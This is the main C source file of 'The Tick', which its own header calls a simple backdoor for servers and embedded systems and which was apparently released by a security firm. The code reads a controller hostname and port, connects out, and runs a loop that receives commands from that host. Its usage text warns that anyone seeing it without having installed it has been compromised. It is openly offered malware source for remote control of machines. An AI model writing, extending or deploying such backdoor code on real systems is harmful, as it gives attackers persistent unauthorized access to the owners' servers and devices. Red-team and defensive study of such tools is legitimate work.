/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "main.h"

#include "config.h"
#include "command.h"
#include "parser.h"

int main(int argc, char *argv[])
{
#ifdef _WIN32

    // On Windows, we must initialize the sockets library.
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        LOG("Failed to initialize Windows sockets, error code: %d\n", GetLastError());
        return 0;
    }

#else

    // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
    signal(SIGPIPE, SIG_IGN);

#endif

    // Command line arguments are the hostname and port.
    Settings s;
#if TICK_CONFIG_USE_ARGV
    get_configuration(&s, argc, argv);
#else
    get_configuration(&s);
#endif

    // If we don't have a hostname and port to connect to, quit.
    if (s.hostname[0] == 0 || s.port == 0) {
        LOG("\n"
            "The Tick, a simple backdoor for servers and embedded systems.\n"
#if TICK_CONFIG_USE_ARGV
            "\n"
            "Usage:\n"
#ifdef TICK_CONFIG_PORT
            "\t%s <hostname> [port]\n"
#else
            "\t%s <hostname> <port>\n"
#endif
#endif
            "\n"
            "This is the backdoor component. If you're seeing this and you\n"
            "  didn't install it yourself, I've got bad news for you...\n"
            "\n", basename(argv[0]));
        return 1;
    }

    // We're ready to go!
    LOG("Starting up...\n");

    // Initialize the parser.
    Parser p;
    parser_init(&p, &s);

    // Launch the main command loop.
    while (command_loop(&p) == 0) {}

    // Quit.
    return 0;
}
